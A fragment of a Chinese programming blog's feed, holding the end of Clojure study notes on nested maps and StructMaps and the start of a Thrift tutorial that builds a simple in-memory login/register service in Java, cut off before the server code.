Charles&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;symbol&quot;&gt;:state&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;Missouri&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;symbol&quot;&gt;:zip&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;63304&lt;/span&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;symbol&quot;&gt;:employer&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;symbol&quot;&gt;:name&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;Object Computing, Inc.&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;symbol&quot;&gt;:address&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;span class=&quot;symbol&quot;&gt;:street&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;12140 Woodcrest Executive Drive, Suite 250&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;span class=&quot;symbol&quot;&gt;:city&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;Creve Coeur&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;span class=&quot;symbol&quot;&gt;:state&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;Missouri&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;span class=&quot;symbol&quot;&gt;:zip&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;63141&lt;/span&gt;&amp;#125;&amp;#125;&amp;#125;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;  为了获取这个人的employer的address的city的值，我们一般有三种方法。&lt;/p&gt;
  &lt;figure class=&quot;highlight clojure&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;; 使用get-in函数&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;get-in&lt;/span&gt;&lt;/span&gt; person [&lt;span class=&quot;symbol&quot;&gt;:employer&lt;/span&gt; &lt;span class=&quot;symbol&quot;&gt;:address&lt;/span&gt; &lt;span class=&quot;symbol&quot;&gt;:city&lt;/span&gt;])&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;; 宏 -&amp;gt; 本质上是调用一系列的函数，前一个函数的返回值作为后一个函数的参数. &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;/span&gt; person &lt;span class=&quot;symbol&quot;&gt;:employer&lt;/span&gt; &lt;span class=&quot;symbol&quot;&gt;:address&lt;/span&gt; &lt;span class=&quot;symbol&quot;&gt;:city&lt;/span&gt;) &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;; reduce 函数接收一个需要两个参数的函数, 一个可选的value以及一个集合。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;reduce&lt;/span&gt;&lt;/span&gt; get person [&lt;span class=&quot;symbol&quot;&gt;:employer&lt;/span&gt; &lt;span class=&quot;symbol&quot;&gt;:address&lt;/span&gt; &lt;span class=&quot;symbol&quot;&gt;:city&lt;/span&gt;])&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;  修改一个内嵌的key值，我们可以使用&lt;code&gt;assoc-in&lt;/code&gt;或者&lt;code&gt;update-in&lt;/code&gt;，不同之处在于&lt;code&gt;update-in&lt;/code&gt;的新值是通过一个给定的函数来计算出来的。&lt;/p&gt;
  &lt;figure class=&quot;highlight clojure&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;assoc-in&lt;/span&gt; person [&lt;span class=&quot;symbol&quot;&gt;:employer&lt;/span&gt; &lt;span class=&quot;symbol&quot;&gt;:address&lt;/span&gt; &lt;span class=&quot;symbol&quot;&gt;:city&lt;/span&gt;] &lt;span class=&quot;string&quot;&gt;&quot;Clayton&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;update-in&lt;/span&gt;&lt;/span&gt; person [&lt;span class=&quot;symbol&quot;&gt;:employer&lt;/span&gt; &lt;span class=&quot;symbol&quot;&gt;:address&lt;/span&gt; &lt;span class=&quot;symbol&quot;&gt;:zip&lt;/span&gt;] str &lt;span class=&quot;string&quot;&gt;&quot;-1234&quot;&lt;/span&gt;) &lt;span class=&quot;comment&quot;&gt;; :zip &quot;63141-1234&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;StructMaps&quot;&gt;&lt;a href=&quot;#StructMaps&quot; class=&quot;headerlink&quot; title=&quot;StructMaps&quot;&gt;&lt;/a&gt;StructMaps&lt;/h2&gt;&lt;p&gt;StructMaps 和普通map类似，它的作用其实是用来模拟java里面的javabean。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;定义&lt;/p&gt;
&lt;figure class=&quot;highlight clojure&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;def&lt;/span&gt;&lt;/span&gt; vehicle-struct (&lt;span class=&quot;name&quot;&gt;create-struct&lt;/span&gt; &lt;span class=&quot;symbol&quot;&gt;:make&lt;/span&gt; &lt;span class=&quot;symbol&quot;&gt;:model&lt;/span&gt; &lt;span class=&quot;symbol&quot;&gt;:year&lt;/span&gt; &lt;span class=&quot;symbol&quot;&gt;:color&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;defstruct&lt;/span&gt;&lt;/span&gt; vehicle-struct &lt;span class=&quot;symbol&quot;&gt;:make&lt;/span&gt; &lt;span class=&quot;symbol&quot;&gt;:model&lt;/span&gt; &lt;span class=&quot;symbol&quot;&gt;:year&lt;/span&gt; &lt;span class=&quot;symbol&quot;&gt;:color&lt;/span&gt;) &lt;span class=&quot;comment&quot;&gt;; 简洁的写法&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;实例化&lt;/p&gt;
&lt;p&gt;使用&lt;code&gt;struct&lt;/code&gt;函数实例化一个StructMap对象，相当于java里面的new关键字。提供给struct的参数的顺序必须和定义时提供的keyword的顺序一致，后面的参数可以忽略。如果忽略，那么对应key的值就是nil。&lt;/p&gt;
&lt;figure class=&quot;highlight clojure&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;def&lt;/span&gt;&lt;/span&gt; vehicle (&lt;span class=&quot;name&quot;&gt;struct&lt;/span&gt; vehicle-struct &lt;span class=&quot;string&quot;&gt;&quot;Toyota&quot;&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;Prius&quot;&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;2009&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;accessor&lt;br&gt;accessor 函数可以创建一个类似java里面的getXXX的方法， 它的好处是可以避免hash查找， 它比普通的hash查找要快。&lt;/p&gt;
&lt;figure class=&quot;highlight clojure&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;&lt;span class=&quot;builtin-name&quot;&gt;def&lt;/span&gt;&lt;/span&gt; make (&lt;span class=&quot;name&quot;&gt;accessor&lt;/span&gt; vehicle-struct &lt;span class=&quot;symbol&quot;&gt;:make&lt;/span&gt;)) &lt;span class=&quot;comment&quot;&gt;; 注意使用的是def而不是defn&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;make&lt;/span&gt; vehicle) &lt;span class=&quot;comment&quot;&gt;; -&amp;gt; &quot;Toyota&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;name&quot;&gt;vehicle&lt;/span&gt; &lt;span class=&quot;symbol&quot;&gt;:make&lt;/span&gt;) &lt;span class=&quot;comment&quot;&gt;; 效果一样只是慢些&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(&lt;span class=&quot;symbol&quot;&gt;:make&lt;/span&gt; vehicle) &lt;span class=&quot;comment&quot;&gt;; 效果一样只是慢些&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ul&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;最近学习了Clojure，好记性不如烂笔头，把一些知识点记录了下来。原本想放在一篇文章里的，谁知太长了，只好分成了三篇，本文是第一篇。由于是笔记，比较杂乱，建议阅读前先系统地学习Clojure（比如 &lt;a href=&quot;http://java.ociweb.com/mark/clojure/article.htm&quot;&gt;Clojure - Function Programming for JVM&lt;/a&gt;），然后用本笔记知识梳理。&lt;/p&gt;
&lt;h2 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h2&gt;&lt;p&gt;Clojure是一个动态类型的，运行在JVM(JDK5.0以上），并且可以和java代码互操作的函数式语言。这个语言的主要目标之一是使得编写一个有多个线程并发访问数据的程序变得简单。&lt;/p&gt;
&lt;p&gt;Clojure的发音和单词closure是一样的。Clojure之父是这样解释Clojure名字来历的&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;“我想把这就几个元素包含在里面： C (C#), L (Lisp) and J (Java). 所以我想到了 Clojure, 而且从这个名字还能想到closure;它的域名又没有被占用;而且对于搜索引擎来说也是个很不错的关键词，所以就有了它了.”&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="编程语言" scheme="http://wuchong.me/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"/>
    
    
      <category term="Clojure" scheme="http://wuchong.me/tags/Clojure/"/>
    
      <category term="笔记" scheme="http://wuchong.me/tags/%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>Thrift 实践</title>
    <link href="http://wuchong.me/blog/2015/10/07/thrift-practice/"/>
    <id>http://wuchong.me/blog/2015/10/07/thrift-practice/</id>
    <published>2015-10-07T12:22:35.000Z</published>
    <updated>2015-10-08T04:12:46.000Z</updated>
    
    <content type="html">&lt;p&gt;&lt;a href=&quot;/blog/2015/10/07/thrift-induction&quot;&gt;上一篇文章&lt;/a&gt;我们了解了thrift的概念以及类型系统，本文我们通过一个简单的实例来更深入地了解thrift的使用。我们的实例非常简单，就是实现一个登录注册功能，其用户名密码缓存在内存中。&lt;/p&gt;
&lt;h2 id=&quot;编写thrift文件&quot;&gt;&lt;a href=&quot;#编写thrift文件&quot; class=&quot;headerlink&quot; title=&quot;编写thrift文件&quot;&gt;&lt;/a&gt;编写thrift文件&lt;/h2&gt;&lt;p&gt;我们编写一个&lt;code&gt;account.thrift&lt;/code&gt;的文件。&lt;/p&gt;
&lt;figure class=&quot;highlight cpp&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;namespace&lt;/span&gt; java me.wuchong.thrift.generated&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;enum&lt;/span&gt; Operation&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  LOGIN = &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  REGISTER = &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; Request&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;: &lt;span class=&quot;built_in&quot;&gt;string&lt;/span&gt; name,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;: &lt;span class=&quot;built_in&quot;&gt;string&lt;/span&gt; password,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;: Operation op&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;exception InvalidOperation&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;: i32 code,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;: &lt;span class=&quot;built_in&quot;&gt;string&lt;/span&gt; reason&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;service Account&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;doAction&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;: Request request)&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;: InvalidOperation e)&lt;/span&gt;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;p&gt;然后在命令行下运行如下命令：&lt;br&gt;&lt;figure class=&quot;highlight applescript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;thrift &lt;span class=&quot;comment&quot;&gt;--gen java account.thrift&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;则会在当前目录生成&lt;code&gt;gen-java&lt;/code&gt;目录，该目录下会按照namespace定义的路径名一次一层层生成文件夹，如下图所示，在指定的包路径下生成了4个类。&lt;br&gt;&lt;img src=&quot;http://ww1.sinaimg.cn/mw690/81b78497jw1ewsui5oaftj20he058t92.jpg&quot; alt=&quot;&quot;&gt;￼&lt;/p&gt;
&lt;h2 id=&quot;服务实现&quot;&gt;&lt;a href=&quot;#服务实现&quot; class=&quot;headerlink&quot; title=&quot;服务实现&quot;&gt;&lt;/a&gt;服务实现&lt;/h2&gt;&lt;p&gt;到此为止，thrift已经完成了其工作。接下来我们需要做的就是实现&lt;code&gt;Account&lt;/code&gt;接口里的具体逻辑。我们创建一个&lt;code&gt;AccountService&lt;/code&gt;类，实现&lt;code&gt;Account.Iface&lt;/code&gt;接口。逻辑非常简单，将用户账户信息缓存在内存中，实现登录注册的功能，并且对一些非法输入状况抛出异常。&lt;/p&gt;
&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;package&lt;/span&gt; me.wuchong.thrift.impl;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; me.wuchong.thrift.generated.Account;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; me.wuchong.thrift.generated.InvalidOperation;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; me.wuchong.thrift.generated.Operation;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; me.wuchong.thrift.generated.Request;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; java.util.HashMap;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; java.util.Map;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;/**&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; * Created by wuchong on 15/10/7.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;AccountService&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;implements&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;Account&lt;/span&gt;.&lt;span class=&quot;title&quot;&gt;Iface&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;static&lt;/span&gt; Map&amp;lt;String, String&amp;gt; accounts = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; HashMap&amp;lt;&amp;gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;meta&quot;&gt;@Override&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; String &lt;span class=&quot;title&quot;&gt;doAction&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(Request request)&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;throws&lt;/span&gt; InvalidOperation &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        String name = request.getName();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        String pass = request.getPassword();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        Operation op = request.getOp();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        System.out.println(String.format(&lt;span class=&quot;string&quot;&gt;&quot;Get request[name:%s, pass:%s, op:%d]&quot;&lt;/span&gt;, name, pass, op.getValue()));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (name == &lt;span class=&quot;keyword&quot;&gt;null&lt;/span&gt; || name.length() == &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; InvalidOperation(&lt;span class=&quot;number&quot;&gt;100&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;param name should not be empty&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (op == Operation.LOGIN) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            String password = accounts.get(name);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (password != &lt;span class=&quot;keyword&quot;&gt;null&lt;/span&gt; &amp;amp;&amp;amp; password.equals(pass)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;Login success!! Hello &quot;&lt;/span&gt; + name;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;Login failed!! please check your username and password&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (op == Operation.REGISTER) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (accounts.containsKey(name)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; String.format(&lt;span class=&quot;string&quot;&gt;&quot;The username &#39;%s&#39; has been registered, please change one.&quot;&lt;/span&gt;, name);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                accounts.put(name, pass);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;Register success!! Hello &quot;&lt;/span&gt; + name;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; InvalidOperation(&lt;span class=&quot;number&quot;&gt;101&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;unknown operation: &quot;&lt;/span&gt; + op.getValue());&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;启动服务端和客户端&quot;&gt;&lt;a href=&quot;#启动服务端和客户端&quot; class=&quot;headerlink&quot; title=&quot;启动服务端和客户端&quot;&gt;&lt;/a&gt;启动服务端和客户端&lt;/h2&gt;&lt;p&gt;我们实现了服务的具体逻辑，接下来需要启动该服务。这里我们需要用到thrift的依赖包。在pom.xml中加入对thrift的依赖。&lt;/p&gt;
&lt;figure class=&quot;highlight xml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;dependency&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;groupId&lt;/span&gt;&amp;gt;&lt;/span&gt;org.apache.thrift&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;groupId&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;artifactId&lt;/span&gt;&amp;gt;&lt;/span&gt;libthrift&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;artifactId&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;version&lt;/span&gt;&amp;gt;&lt;/span&gt;0.9.2&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;version&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;dependency&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;em&gt;注：如果你的依赖中没有加入slf4j的实现，则需要加上slf4j-log4j12或者logback的依赖，因为thrift有用到slf4j&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;启动服务的实现如下：&lt;/p&gt;
